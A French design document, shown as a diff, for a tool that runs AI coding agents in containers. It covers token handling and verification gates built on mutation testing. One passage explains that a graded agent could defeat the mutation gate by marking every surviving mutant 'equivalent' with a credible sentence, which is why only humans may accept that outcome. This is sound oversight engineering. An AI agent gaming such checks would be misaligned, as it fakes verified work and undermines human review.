+- **Rien n'est inventé.** Sans aucune source, `nunki` dit qu'il ne sait pas
+  plutôt que d'écrire « l'humain » comme s'il s'agissait d'un nom.
+- L'en-tête de mission porte **`arbiter`** : qui tranche quand elle revient
+  avec une question. Il vaut par défaut celui qui a cadré la mission, se
+  force avec `nunki mission new --for <nom>`, et se **fige avec le reste de
+  l'en-tête**. `FOLLOWUP_HQ.md` est adressé à cette personne par son nom.
+- `nunki whoami` dit qui `nunki` croit avoir en face, et d'où il le tient.
+
+**Plusieurs comptes, et la mission choisit.** Un humain peut détenir
+plusieurs abonnements, chez un ou plusieurs fournisseurs, et doit pouvoir dire
+quelle mission dépense lequel. Donc :
+
+- les comptes vivent dans `~/.nunki/accounts.yaml`, **à côté des homes de projet et hors
+  de tout dépôt** — un compte appartient à l'humain, pas à un projet, et deux
+  projets partagent les mêmes abonnements. Les jetons sont dans des fichiers
+  à part, un par compte, pour que l'index se lise sans lire les secrets ;
+- chaque compte déclare **quel harnais il authentifie**. Un abonnement OpenAI
+  n'authentifie pas Claude Code, et le passer quand même échouerait dans un
+  conteneur avec personne pour lire l'erreur : `nunki` refuse avant de lever
+  quoi que ce soit ;
+- le choix se fait par ordre de précision — l'en-tête de la mission, puis
+  `nunki.yaml`, puis le `default:` de l'index ; et **quand il n'existe qu'un
+  compte, c'est la réponse et non une question** ;
+- un compte que l'en-tête nomme est **figé avec lui**. Quand l'en-tête n'en
+  nomme aucun — le cas par défaut, `mission new` ne l'écrit qu'avec
+  `--account` —, chaque lancement reprend `nunki.yaml`, puis le `default:`.
+  Qui détient plusieurs abonnements peut donc **basculer une mission d'un
+  compte à l'autre entre deux runs**, sans attendre la remise à zéro de la
+  fenêtre du premier : il change `account:` dans `nunki.yaml`, et le
+  lancement suivant, de `verify` comme du moniteur, part sur le nouveau. Un
+  run en cours garde le compte qui l'a lancé : c'est son jeton qu'il
+  dépense, et sa mesure est rangée sous ce compte. La bascule lève l'attente
+  d'une fenêtre, pas celle du harnais : un 429 attend son délai, quel que
+  soit le compte ;
+- **quel nom de variable porte le jeton est la connaissance du harnais**, pas
+  celle du moteur : l'adaptateur le déclare (`token_env`), et `nunki` ne connaît
+  que le nom du compte ;
+- **le jeton n'est écrit dans aucun fichier** que `nunki` produit. Ni dans le
+  profil : c'est le fichier qu'on lit pour comprendre un slot, et le lire
+  en partie a imprimé le jeton dans la transcription d'une session (#170).
+  Ni sur la ligne de commande du moteur, que tout utilisateur de la machine
+  lit avec `ps`. Il entre au seul `exec` qui en a besoin, celui qui lance le
+  harnais : la ligne dit `-e <nom>` sans valeur, et la valeur est dans
+  l'environnement du client que `nunki` lance, d'où Compose la prend —
+  mesuré avec Compose v5.5.0, et un nom que le client ne porte pas laisse la
+  variable absente dans le conteneur, pas vide. Il n'est pas non plus dans
+  la configuration du conteneur : `docker inspect` ne le montre pas, et une
+  porte ou une campagne, lancées par d'autres `exec`, ne le reçoivent pas.
+  Ce que cela ne tient pas, dit honnêtement : le harnais lit son jeton dans
+  son environnement et nulle part ailleurs — Claude Code n'offre ni fichier
+  ni descripteur pour `CLAUDE_CODE_OAUTH_TOKEN`, et `apiKeyHelper` sert une
+  clé d'API —, donc ce que l'agent lance en hérite. Un profil écrit par un
+  `nunki` plus ancien le porte encore jusqu'au lancement suivant, qui le
+  réécrit.
+
+`nunki check` vérifie que le compte nommé existe, qu'il authentifie bien le
+harnais du projet, que son fichier est hors du dépôt et qu'il n'est pas
+lisible par d'autres. `nunki account list` dit ce qui est déclaré et ce qui est
+prêt.
+
+Un adaptateur est jetable. Le jour où le harnais change d'affichage ou de
+mécanisme, on réécrit l'adaptateur, pas la méthode. Le premier adaptateur est
+Claude Code, parce que c'est celui qui existe ; le second est ce qui prouvera
+que la frontière tient. Un adaptateur **factice**, qui répond des états
+connus sans conteneur, sert aux tests du moteur.
+
+### 4.4 Les portes de vérification
+
+Déterministes. Les portes 1 à 4 sont jouées **à la fin de chaque run**, pas
+seulement à la vérification finale : une porte de périmètre qui ne tombe
+qu'à la vérification finale perd une mission de six heures pour une écriture
+interdite au premier lot. La porte 8 aussi, pour la même raison et parce qu'elle est bon marché :
+un avis introduit au premier lot ne doit pas être trouvé au cinquième. Les
+portes 5 à 7 sont jouées à la vérification finale, quand le codeur a fini son
+dernier lot. La première rouge arrête tout.
+
+1. arbre propre — jugé **octet par octet** par `nunki` : chaque fichier suivi
+   est haché sans filtre, attribut ni conversion et comparé à l'id de l'arbre
+   de `HEAD` résolu dans le miroir, mode et type compris, au travers d'un
+   index reconstruit à chaque appel et sans information `stat`. Ni l'index
+   du slot, ni son `info/exclude`, ni sa configuration, ni aucun
+   `.gitattributes` n'entrent dans la réponse ; un projet qui compte sur une
+   conversion à l'extraction (`text`, `eol`, `ident`) s'y lit « pas propre » ;
+2. branche non protégée et en avance sur sa base — le `HEAD` du slot est la
+   branche de la mission (un `HEAD` détaché ou sur une autre branche est
+   refusé), et la base, pour cette porte comme pour les portes 4, 7 et 8, est
+   celle que l'hôte a enregistrée (`refs/nunki/origin/<base>`), jamais une ref
+   du slot ; sans cet enregistrement, la porte échoue et le dit. Si la base a avancé
+   pendant la vérification, la branche n'est **jamais rebasée par un agent** :
+   `nunki push` pousse telle quelle et la pull request porte le conflit, que
+   l'humain résout ;
+3. le bloc `ÉTAT DE REPRISE` en tête du journal nomme `HEAD` ;
+4. périmètre respecté, **sur le diff base..HEAD et commit par commit** (un
+   commit interdit puis reverté laisse un arbre propre et une histoire
+   sale) : chemins protégés du projet ; zone de tests de la stack pour une
+   mission de tests ; et pour l'intégrateur, « câblage » **défini
+   mécaniquement** comme la liste de chemins que sa `MISSION.md` déclare
+   (configuration, tests système, migrations, fichiers d'infrastructure) —
+   tout commit hors de cette liste est hors périmètre. **Le fichier de
+   services du projet est refusé à l'un comme à l'autre**, par son chemin
+   exact, avant que la liste de câblage soit lue : il est à l'humain, et le
+   profil système le lève tel que la base le porte (4.2, règle 1). Le
+   modifier, le supprimer ou le renommer est hors périmètre, même si le
+   câblage le nomme ; un commit qui le reverte ne suffit pas, et la
+   modification se propose dans `PR.md` ;
+5. livrable présent (`PR.md`) ;
+6. batterie verte — absente ou non exécutable, la porte **échoue**, elle ne
+   saute pas ;
+7. **mutation** : campagne jouée sur ce que la branche a changé. **Pas de
+   seuil** au niveau `critical` : la porte est verte quand **chaque survivant
+   a reçu une des trois issues** — tué par un test nommé, reconnu comme bug et
+   figé dans un test, ou démontré équivalent en une phrase.
+
+   **Le niveau d'exigence règle cette porte.** Au niveau `prototype`, elle ne
+   s'applique pas et aucune campagne n'est due. Au niveau `standard`, elle est
+   verte quand la part de mutants tués (essayés moins les survivants restés
+   sans issue, rapportés aux essayés) atteint `mutation_threshold` ; les
+   survivants sans issue sont comptés dans sa note, sans la rendre rouge. Une
+   campagne qui ne donne pas son compte, ou un compte inférieur à ses
+   survivants, est jugée comme au niveau `critical` ; une campagne qui n'a
+   rien trouvé à muter passe.
+
+   **Une campagne qui n'a rien mesuré n'est jamais verte**, à aucun niveau.
+   La ligne de fin n'est écrite que si le statut de l'outil dit que la
+   campagne est allée au bout, et **une seule** est acceptée : un journal qui
+   en porte deux est refusé. Quand la stack sait compter sur les lignes
+   changées, cette ligne porte ses comptes,
+   `{"campaign":"done","tried":N,"found":M}`, tirés des résultats de l'outil,
+   mutants non viables exclus ; `found > 0` avec `tried = 0` n'est pas une
+   mesure : rien n'est enregistré et la porte est rouge avec la cause. Une
+   stack qui ne sait compter que sur des fichiers entiers ne donne pas de
+   compte (sauf `tried` 0 quand rien n'est mutable), et le niveau `standard`
+   y est jugé comme `critical` : un seuil sur des fichiers entiers laisserait
+   un fichier déjà bien testé cacher des lignes nouvelles non testées.
+   La campagne Rust ne lit **aucune configuration de l'arbre qu'elle mute**
+   (`cargo mutants --no-config`).
+
+   **Une campagne ne perd pas un survivant qu'elle a trouvé.** La ligne de
+   fin peut porter un compte de plus, `"missed":K` : le nombre de survivants
+   que l'outil a rapportés. Il vient **du compte que l'outil tient lui-même**,
+   jamais des lignes que le script imprime ni de celles qu'il a lues pour les
+   imprimer : un compte tiré des mêmes lignes s'accorde toujours avec elles.
+   Quand il est là, `nunki` le compare aux lignes de survivants qu'il a lues,
+   et une campagne où les deux diffèrent, **dans un sens ou dans l'autre**,
+   n'a pas mesuré : moins de lignes, c'est un survivant perdu ; plus, c'est
+   une ligne que quelque chose d'autre a écrite. Elle prend le chemin de la
+   campagne qui n'a rien mesuré : rien n'est enregistré, la porte 7 est rouge
+   avec les deux nombres, et `nunki push` n'a rien pour répondre. Sans ce
+   compte, la ligne est lue comme avant. Sur plusieurs stacks, chaque compte
+   est comparé aux lignes de sa propre stack avant d'être additionné :
+   comparées seulement dans la somme, une ligne perdue ici et une ligne en
+   trop là s'annuleraient.
+
+   Mesuré avec cargo-mutants 27.1.0 et le script déposé jusque-là, qui
+   échappait ses lignes JSON à la main et lisait `missed.txt`, un mutant par
+   ligne. Un crate d'exemple portait deux fichiers atteints par `#[path]`,
+   l'un avec une tabulation dans son nom, l'autre avec un saut de ligne, cinq
+   mutants chacun, sans test. L'outil rapportait **10 survivants**. Les cinq
+   lignes de la tabulation n'étaient pas du JSON et étaient écartées en
+   silence ; le saut de ligne coupait chacun des cinq autres en deux lignes
+   valides. `nunki` lisait donc 10 survivants, **dont aucun n'était un de
+   ceux de l'outil** : la perte et la coupure s'annulaient, et c'est pourquoi
+   le compte ne peut pas venir des lignes. Avec la seule tabulation, aucun
+   survivant n'était lu, et la porte 7 du niveau `standard` passait.
+
+   **Les lignes changées, pas les fichiers entiers.** C'est la règle de la
+   porte 8 : **ce qui est nouveau depuis la base appartient à la mission, ce
+   qui préexiste appartient au projet.** Une
+   campagne sur les fichiers entiers fait répondre le codeur de tout
+   l'historique de chaque fichier qu'il touche : mesuré sur un vrai dépôt, une
+   correction d'une quarantaine de lignes dans un fichier de 1 900 lignes
+   donnait **505 mutants** sur les fichiers touchés, contre **42** sur les
+   lignes changées. La campagne dépassait son délai, et le codeur aurait écrit
+   des tests pour du code qu'il n'avait pas écrit.
+
+   `nunki` passe à `mutation.sh` le **point de fourche** de la branche dans la
+   variable `NUNKI_BASE` — un commit, jamais un nom, pour la raison que donne
+   la porte 8 : la copie propre de `HEAD` ne porte aucune branche, et le point
+   de fourche y est par construction. Une variable plutôt qu'un argument, pour
+   que le `mutation.sh` qu'un projet a réécrit, qui lit
+   `<campaign-id> <path>...`, continue de marcher tel quel. La stack restreint
+   sa campagne au diff depuis ce commit quand son outil le sait : pour Rust,
+   `cargo-mutants --in-diff`, qui ne garde que les mutants que le diff
+   atteint. Python (mutmut) et Next (Stryker) ne le font pas encore : leurs
+   scripts mutent toujours les fichiers entiers, et restreindre leurs
+   campagnes est un travail de stack à part. Un diff qui n'atteint aucun mutant — un commentaire, un test — est
+   une campagne sans survivant, pas une campagne qui n'a pas pu tourner : les
+   deux ne laissent aucun `mutants.out`, et seul le statut de l'outil les
+   distingue (mesuré sur cargo-mutants 27.1.0 : 0 pour l'une, 1 pour un crate
+   qui ne se lit pas). Une base que la copie ne sait pas lire est une campagne
+   qui n'a pas pu tourner, dite comme telle, jamais un repli silencieux sur les
+   fichiers entiers.
+
+   L'empreinte reste celle des fichiers touchés : une base qui bouge sans
+   changer un fichier touché laisse leur diff identique, et une base qui les
+   change change leur contenu après le rebase.
+
+   **Le script de campagne, mesuré contre le vrai outil.** Un bouchon qui
+   imprime une ligne JSON ne montre rien de ce qui suit ; seule l'exécution
+   contre le vrai outil (cargo-mutants 27.1.0) le montre :
+
+   - **`--output DIR` écrit dans `DIR/mutants.out/`**, pas dans `DIR`. Le
+     script qui lit les résultats dans `DIR` ne trouve rien et sort en
+     erreur : **toutes** les campagnes échouent ;
+   - **`--output` ne crée pas le répertoire parent**. Une copie propre de
+     `HEAD` jamais compilée n'a pas de `target/` — et c'est exactement là que
+     la porte 7 tourne ;
+   - **plusieurs mutants partagent une position.** `> ==`, `> <` et `> >=`
+     sont tous à `src/lib.rs:2:7`, donc ni `fichier:ligne` ni
+     `fichier:ligne:colonne` ne les distingue. **L'identifiant est la ligne
+     entière**, qui est le nom que l'outil donne lui-même à un mutant — sans
+     quoi le codeur reçoit des survivants qu'il ne peut pas répondre un par
+     un dans un fichier dont c'est toute la raison d'être ;
+   - **`cargo-mutants` doit être dans l'image.** Le fragment de stack
+     l'installe dans son image, après `USER agent` : posé en root, il
+     atterrit là où le seul utilisateur qui le lance ne peut pas le lire.
+
+   **Une campagne en vol possède la copie propre de `HEAD`.** Elle y tourne
+   `--in-place`, et toute porte qui travaille dans cette copie y arrive par
+   `exec::run(On::Proof)`, qui la rafraîchit d'abord — `git reset --hard`,
+   `git clean`. Jouées ensemble, elles se détruisent dans les deux sens : la
+   porte juge un mutant, et le rafraîchissement arrache l'arbre sous la
+   campagne.
+
+   La batterie jouée pendant une campagne revient rouge sur un `warning:
+   unused variable` dans une fonction dont cargo-mutants a remplacé le corps,
+   et qui utilise son argument dans le code du codeur. Le flux lit alors la
+   porte 6 rouge et ouvre un volet, jusqu'à épuisement, sans que
+   l'intégrateur ni l'agent de sécurité ne tournent jamais — alors qu'aucun
+   agent n'a rien fait de travers.
+
+   Les portes 6 et 8 sont donc **non jouées** tant qu'une campagne est en
+   vol — un verdict sur la machine et non sur l'agent, comme la base d'avis
+   absente, et une porte que personne n'a pu jouer arrête la vérification au
+   lieu d'ouvrir un volet. La mission attend la campagne au lieu de la payer.
+
+   **Et ce qui garde cette copie est éprouvé contre un vrai système de
+   fichiers.** Les doubles de test du projet répondent à chaque `exec` par une
+   sortie préparée, quel que soit l'argv : ils n'ont donc aucun dossier qu'un
+   `git reset --hard` pourrait détruire, aucun processus qu'un `stop` pourrait
+   tuer, et aucun statut de sortie d'où quoi que ce soit pourrait venir. Les
+   défauts d'orchestration traversent les tests bâtis dessus, parce que
+   chacun est une interaction entre une vraie commande et un vrai état.
+
+   Un moteur **local** exécute donc ce qu'on lui donne, ici, en réécrivant les
+   chemins du conteneur vers des répertoires temporaires. Il ne remplace pas
+   les tests live sur un vrai conteneur, qui restent la seule preuve qui
+   compte : il tourne là où ceux-là ne tournent jamais, dans la CI. Et ce
+   qu'il ne fait pas, il le refuse au lieu de faire semblant — un double qui
+   réussit silencieusement ce qu'il n'implémente pas est le défaut qu'il
+   remplace, un étage plus bas.
+
+   **Et la copie propre a un propriétaire, pas une consigne.** Le registre de
+   la campagne en vol est classé **par slot** — `hq/campaigns/<slot>.json` — et
+   non par mission, parce que ce dont il parle appartient au slot : tout ce qui
+   atteint cette copie sait dans quel slot il travaille, et pas quelle mission
+   a demandé. Classé par mission, le registre serait introuvable par le code
+   qui doit le respecter.
+
+   Le refus vit **dans `exec::run(On::Proof)` et `exec::refresh`**, la porte
+   par laquelle tout passe, et non dans chaque appelant : une garde
+   « l'appelant doit y penser » est oubliée par un appelant — la batterie, la
+   porte 8, `nunki exec`, `nunki mission gates`. Il ne refuse
+   pas le lancement de la campagne elle-même : celle-ci rafraîchit et sonde
+   **avant** de déposer son registre, et ne retouche plus la copie ensuite.
+   L'arbre de travail, lui, n'est jamais refusé : aucune campagne n'y est.
+
+   **Et une campagne et un run d'agent ne partagent jamais un slot.** Dans le
+   flux, ils ne se croisent pas : `verify` ne lance une campagne qu'au stade
+   `Gates`, et seulement portes 1 à 5 déjà vertes — une porte rouge est
+   traitée avant, et le tour n'atteint jamais la campagne. Rien de ce que fait
+   la campagne ne peut ensuite les rougir : elle réécrit la copie propre de
+   `HEAD`, elles lisent l'arbre du slot. La mission reste donc à `Gates`
+   jusqu'à ce que la campagne soit relue, et aucun run n'est lancé.
+
+   Ce qui peut les croiser, c'est un verbe tapé hors du flux. `nunki mission
+   mutants` prend donc le verrou du slot et refuse pendant un run d'agent,
+   exactement comme `verify` — une campagne ne lève aucun profil, ce qui la
+   fait passer pour inoffensive, et c'est la seule porte par laquelle les
+   deux se rencontrent.
+
+   Et `run::launch` **relit la campagne avant de basculer le conteneur**. La
+   relecture est l'essentiel de ce qu'elle fait : un registre survit à sa
+   campagne dès que quelque chose s'est arrêté avant de la relire, et il n'y a
+   alors rien à terminer. Une campagne vraiment en vol à cet endroit vient
+   d'un chemin non prévu ; elle est **terminée et dite**, parce que le
+   basculement recrée le conteneur où elle vit et qu'elle meurt de toute
+   façon — et parce qu'un slot qui se tait une heure sans rien rendre mérite
+   une phrase. Rien n'est écrit dans `MUTANTS.json` : une campagne écourtée
+   n'a rien mesuré.
+
+   **Et un rapport ne dit qu'une chose au flux, décidée une seule fois.**
+   Quatre réponses — vert, rouge, mur, campagne due — et un seul endroit qui
+   les lit. Trois questions recombinées à la main sur plusieurs sites de
+   `verify` sont l'endroit où les défauts vivent : une nouvelle raison qu'une
+   porte a de n'être pas jouée change le sens de l'ancienne règle partout, en
+   silence.
+
+   L'ordre est la doctrine : le rouge d'abord, parce qu'il est à l'agent et
+   qu'il prime sur une porte que personne n'a pu jouer — il y a alors quelque
+   chose à renvoyer à un agent. Puis la campagne, seul obstacle que `nunki`
+   lève lui-même. Puis le mur, qui attend un humain. Et un mur prime sur la
+   campagne : un profil qui ne se lève pas laisse aussi la porte 6 non jouée,
+   et une heure de mutation devant un mur que rien ne bougera est une heure
+   dépensée pour rien.
+
+   **Mais attendre une campagne n'est pas un mur.** Une porte non jouée arrête
+   normalement le flux : rien n'est décidé, et aucun run n'y changerait quoi
+   que ce soit. La campagne, elle, est le seul obstacle que `nunki` lève
+   lui-même — c'est déjà la distinction que la porte 7 fait quand elle en
+   réclame une. Une porte qui se retire *pendant* qu'une campagne tourne est
+   donc le même obstacle vu de l'autre côté, et si elle compte comme mur, le
+   tour s'arrête avant de relire la campagne : les portes restent retirées
+   pour toujours — chaque tour de `verify` annonce une campagne en vol, aucun
+   ne la relit. Le constat
+   porte donc un drapeau, et non une phrase que le flux relirait.
+
+   **Une campagne n'est une mesure qu'une fois qu'elle a dit l'être.** Elle
+   imprime, en dernier et une seule fois, `{"campaign":"done"}` ; `nunki` ne
+   lit aucun autre résultat. Sans cette ligne, trois échecs laissent la même
+   trace — un journal qui s'analyse en zéro survivant : une campagne tuée en
+   route, une dont le conteneur a disparu, une qui n'a jamais compilé. Lues
+   toutes les trois comme « rien n'a survécu », elles feraient passer la
+   porte 7 au vert sur une mesure que personne n'a faite. C'est exactement ce
+   que 4.4 lui interdit plus haut : **une porte 7 qui ne peut pas dire « je
+   n'ai pas pu mesurer » ment.**
+
+   Une ligne du script et non un code de sortie, parce que le code de sortie
+   ne survit pas : le lanceur fait `exec` sur la commande pour que le pid
+   publié soit celui de la campagne, et un shell remplacé ne peut pas écrire
+   `$?` — le retirer emporterait avec lui le contrôle d'identité de tous les
+   runs d'agent. Un journal tronqué perd sa dernière ligne, qui est
+   celle-ci ; les trois échecs échouent donc pareil. Rien n'est alors écrit,
+   le registre en vol est effacé — aucune porte ne se retire pour rien — et le
+   `verify` suivant en lance une vraie.
+
+   **Une campagne qui n'a pas pu tourner ne doit pas rendre la réponse de la
+   précédente.** Le script avale le statut de
+   l'outil — `|| true`, et c'est juste, une campagne avec survivants sort en 2
+   et c'est un résultat. Mais une campagne qui échoue *avant* les mutants ne
+   crée aucun dossier de sortie : `mutants.out` est encore celui d'avant, et
+   le script y lit des survivants d'une campagne qui n'a jamais eu lieu, sur
+   du code qui a changé depuis. Le rejeu d'une même empreinte revient au même
+   chemin, donc le cas est atteignable.
+
+   Ce n'est pas le cas nominal : une campagne qui atteint
+   les mutants fait tourner `mutants.out` en `mutants.out.old` et en écrit un
+   neuf — une seconde campagne qui tue tout ne laisse aucun survivant de la
+   première. Le script **vide donc son dossier avant de lancer** : le même
+   échec ne laisse alors rien, et la garde sur le fichier de résultats de
+   l'outil (`outcomes.json`) dit « la campagne n'a rien laissé », ce qui est
+   la vérité. Une porte 7 qui ne peut pas dire « je n'ai
+   pas pu mesurer » ment — c'est la règle du 4.4 sur la base d'avis, ici pour
+   la campagne.
+
+   **Et elle n'est pas redemandée sur le même contenu.** Ce qu'elle a dit
+   sur sa sortie d'erreur, à côté du journal nommé par l'empreinte, est ce
+   que la porte 7 rend : rouge, et le codeur reçoit la raison en volet —
+   relancer la même campagne sur le même contenu échouerait pareil, c'est la
+   branche qui doit changer. Cela vaut aussi quand `MUTANTS.json` tient une
+   campagne plus ancienne, sur un contenu qu'un volet a depuis changé.
+   Mesuré (#166) : la porte n'y regardait que lorsqu'aucun `MUTANTS.json`
+   n'existait. Elle répondait donc « la campagne a tourné sur un autre
+   contenu », le moniteur en relançait une, qui échouait pareil, 37 fois en
+   deux heures, sans que `wait` dise rien. La sortie d'erreur ne compte alors
+   que si elle est **postérieure à la date que cette campagne a enregistrée** :
+   une campagne qui a mesuré laisse elle aussi une sortie d'erreur, pleine de
+   sa progression, et un contenu ramené à ce qu'elle a mesuré — un commit
+   annulé — la lirait comme un échec. La date enregistrée, et non celle du
+   fichier, qu'une décision sur un survivant réécrit.
+
+   Un test live joue le script **tel que `nunki init` le dépose** sur un crate
+   d'exemple dont une fonction n'a aucun test, et lit ses survivants avec le
+   parseur de la porte 7. C'est ce qu'AGENTS.md § 4 appelle prouver en
+   exécutant.
+
+   **Qui écrit quoi, et le partage suit la vérifiabilité.** Les deux premières issues sont du code — écrire un test —
+   et seul le codeur commite : il les écrit, dans `MUTANTS.triage.json`, et
+   `nunki` les contrôle (le test nommé existe). La troisième n'est pas du code,
+   c'est un jugement, et **aucune machine ne peut le vérifier** : elle n'est
+   acceptée que de la main de l'humain ou du HQ, dans `MUTANTS.json`. Un
+   `equivalent` venu du fichier de l'agent rend la porte rouge et est nommé.
+
+   **Le codeur propose, le HQ tranche.** Le codeur peut écrire, dans
+   `MUTANTS.triage.json`, `{"kind": "equivalent_proposed", "why": "<une
+   phrase>"}` : une **proposition** d'équivalence, jamais un avis. La porte 7
+   la compte comme une issue au niveau `critical`, et dans la part de mutants
+   tués au niveau `standard`, pour que la mission continue ; sa note la
+   compte à part des mutants tués, des bugs et des avis. Une phrase vide
+   n'est pas une issue, ni une proposition sur un survivant dont le HQ a déjà
+   refusé la proposition. Un survivant qui porte une proposition valide n'est
+   plus « sans issue » : il ne peut pas faire l'objet d'une ligne
+   `awaits ruling`.
+
+   **Du fichier du codeur, `nunki` ne lit que ce que le codeur a le droit de
+   donner** : `killed`, `bug` et `equivalent_proposed`. Tout le reste —
+   `equivalent`, une proposition de `nunki`, une entrée illisible — n'est pas
+   une issue, ne masque jamais `MUTANTS.json`, et est nommé comme refusé dans
+   la note de la porte 7 et dans le refus de `nunki push`. Une entrée
+   illisible ne refuse qu'elle-même ; un fichier qui n'est pas un objet
+   d'entrées reste illisible en entier.
+
+   **Un test nommé est un nom** : des lettres, des chiffres et des tirets
+   bas, trois caractères au moins. Tout autre texte n'est pas une issue. Le
+   nom est cherché comme un mot entier, jamais comme un fragment — sans quoi
+   un nom vide ou d'une lettre se trouve dans n'importe quel fichier. Un
+   titre de test avec des espaces (JavaScript) n'est donc pas un nom.
+
+   **Le HQ répond à une proposition par deux verbes.**
+   `nunki mission mutants <id> --ratify <survivant> [--because <pourquoi>]`
+   écrit le même avis que `--equivalent`, avec la phrase de la proposition
+   sauf si `--because` la remplace. `--refuse <survivant> --because
+   <pourquoi>` retire la proposition, inscrit le refus sur le survivant dans
+   `MUTANTS.json`, le rouvre, et écrit la raison dans `FOLLOWUP_HQ.md`, que le
+   prochain run du codeur lit. Un avis donné plus tard efface le refus.
+   `--ratify --all` ratifie toutes les propositions en attente : il imprime
+   d'abord chacune avec sa source et sa phrase, puis tranche exactement la
+   liste imprimée, ou rien ; s'il s'arrête en route, il dit lesquelles il a
+   tranchées. Un avis contre un état de mission illisible est refusé : seul
+   un état absent veut dire « pas démarrée ».
+
+   **D'une campagne à la suivante, un avis devient une proposition.** Quand
+   la même mutation survit encore — même fichier et même description (le
+   texte avant et après la mutation), jamais la ligne, que le moindre commit
+   au-dessus déplace — l'avis du HQ n'est pas redemandé de zéro, mais il
+   n'est **jamais reporté comme avis** : il revient comme une proposition de
+   `nunki` (`proposed_by_nunki`), marquée reportée, avec sa phrase et le
+   commit de la campagne où il a été donné. La mission continue, et
+   `nunki push` attend que le HQ ratifie. Les seules équivalences du
+   `MUTANTS.json` d'une campagne sont donc celles que le HQ a tapées sur
+   cette campagne. La raison : rien ne prouve à `nunki` que le mutant
+   d'aujourd'hui est celui d'hier — une description identique peut désigner
+   un autre code — et un avis qui se reporte seul est une porte qui se vide
+   seule.
+
+   Deux niveaux de correspondance, qui regardent **toute** la campagne
+   précédente :
+   - *exact* — même identifiant, même fichier, même description : la
+     proposition est reportée telle quelle, un avis devient une proposition
+     reportée, un refus reste un refus ;
+   - *large* — même fichier et même description sous un autre identifiant :
+     ne vaut que si la paire désigne un seul survivant avant et un seul
+     maintenant, et que le code que la mutation remplace n'apparaît qu'une
+     fois dans son fichier. Sinon rien n'est proposé.
+
+   **Un refus est toujours reporté**, quelle que soit l'unicité : un nouvel
+   identifiant reçoit le refus donné sur n'importe quel survivant du même
+   fichier et de la même description, pour qu'une proposition refusée ne
+   redevienne pas une issue en changeant de ligne. La proposition du codeur,
+   elle, n'est jamais reportée : il la réécrit. Aucune issue n'est jamais lue
+   dans le journal de la campagne : il est écrit dans le conteneur de
+   l'agent.
+
+   **Le registre des équivalences du projet.** Un avis vaut pour le projet,
+   pas pour une mission : sans registre, la mission suivante qui touche le
+   même fichier retrouve le même mutant et repose la même question.
+   - *Où, et qui l'écrit.* `hq/equivalences.json`, dans le foyer du projet :
+     jamais dans le dépôt, jamais monté dans un conteneur. `--equivalent` et
+     `--ratify` y inscrivent l'avis ; `--lift` l'en retire. Une proposition
+     ou un refus n'y entre jamais.
+   - *L'entrée.* Fichier, description, l'empreinte de **toute l'étendue** du
+     code que la mutation remplace au commit de l'avis, la longueur de cette
+     étendue, la phrase, qui, la mission, le commit, la date. L'empreinte est
+     l'identifiant de blob git des lignes de l'étendue, chacune débarrassée
+     de ses blancs de bord, jointes par des retours à la ligne. L'étendue
+     vient de la liste de l'outil : le script de campagne la donne en
+     `end_line` à côté de `line` (0 quand il ne la connaît pas ; un outil qui
+     n'en donne pas vaut la seule ligne).
+   - *Inscrit seulement quand le mutant est identifié sans doute.* La
+     campagne de l'avis porte un seul survivant sur ce fichier et cette
+     description, l'étendue est connue, et son texte n'apparaît qu'une fois
+     dans le fichier. Sinon l'avis vaut pour sa mission, et le verbe dit
+     pourquoi il n'est pas entré au registre. Trancher de nouveau la même
+     mutation remplace son entrée.
+   - *Le registre propose, il ne tranche jamais.* Quand la campagne d'une
+     mission est enregistrée, un survivant sans issue et sans refus reçoit
+     une proposition `proposed_by_nunki` venue du registre quand quatre
+     choses tiennent : une seule entrée et un seul survivant sur ce fichier
+     et cette description, la même empreinte, et une étendue qui n'apparaît
+     qu'une fois dans son fichier. Elle porte la phrase du HQ et son origine
+     (mission, commit, date). Elle n'est pas reportée : la campagne suivante
+     redemande au registre. Ratifier une proposition du registre garde
+     l'origine de l'entrée et inscrit la ratification à côté.
+   - *Fermé par défaut.* Un registre illisible (un fichier vide compris) ne
+     propose rien, et `FOLLOWUP_HQ.md` le dit. Une étendue illisible ne
+     correspond à rien. La source est lue à travers des objets git que
+     `nunki` hache lui-même, objets de remplacement et greffes désactivés ;
+     un arbre qui nomme une entrée deux fois, ou hors de l'ordre de git, est
+     lu comme rien. Le registre est lu et écrit sous son propre verrou ; une
+     écriture est synchronisée puis renommée en place.
+   - *Lever.* `--lift <survivant>` retire un avis, ou la proposition que
+     `nunki` en a faite, du registre d'abord, puis de la mission. Si le
+     registre ne peut être verrouillé, lu ou écrit, il échoue et ne change
+     rien.
+   - *Lister.* `nunki mission mutants --registry`, sans mission, liste les
+     entrées et dit pour chacune si son code tient encore une fois à `HEAD`,
+     a changé, ou se répète.
+
+   `mission status`, `mission wait`, `nunki push` et la note de suivi
+   nomment les propositions par leur source : le codeur, le registre, ou le
+   report.
+
+   La raison est celle qui a mis la batterie hors de portée de l'agent :
+   laisser le noté remplir la seule case que personne ne peut
+   contrôler, c'est une porte qui se vide toute seule — il suffit de cocher
+   « équivalent » partout avec une phrase crédible. Compter les équivalences
+   les signale à un lecteur ; les refuser côté agent les empêche. Un seuil et un triage tiraient en sens contraire, et Google, dont la
+   pratique inspire cette porte, ne fait ni score ni seuil. Le retour des
+   survivants au codeur est un run de plus sur le lot, pas un volet. Quatre
+   particularités, écrites parce qu'elles ne sont pas évidentes : elle tourne
+   **dans le conteneur du slot**, lancée par `nunki exec` comme une commande
+   déterministe déclarée par le fragment de stack, sans session d'agent ; sur
+   une **copie git de l'arbre** à l'intérieur du conteneur, jamais sur l'arbre
+   de travail, parce que les outils de mutation réécrivent les sources et
+   qu'un plantage laisserait un mutant dans le code — et cette copie a **son
+   propre cache de build**, chauffé une fois par slot et conservé : pour Rust,
+   `cargo-mutants` ne réutilise le cache qu'en place (`--in-place`), donc en
+   place sur la copie, jamais sur l'arbre du codeur ; sans cela chaque
+   campagne recompile à froid, et la section 7 le compte. Chaque mutant y
+   coûte d'abord une compilation — mesuré sur un crate de 170 000 lignes,
+   930 s de compilation contre 88 s de tests sur une campagne de 44 mutants —
+   et c'est l'édition de liens qui domine : l'image Rust garde donc les
+   informations de débogage hors des binaires liés
+   (`CARGO_PROFILE_DEV_SPLIT_DEBUGINFO=unpacked`, 51 s ramenées à 18 s par
+   compilation incrémentale, et une mémoire d'édition de liens qui ne fait
+   plus tuer le conteneur). Dans l'environnement de l'image, jamais dans le
+   `Cargo.toml` du projet, qui est le sien. La campagne est
+   **longue**, donc elle se lance et se guette comme un run, avec un délai
+   paramétré ; et elle **ne rejoue que si les fichiers touchés ont changé**
+   depuis la dernière campagne verte sur cette mission. Son résultat est un
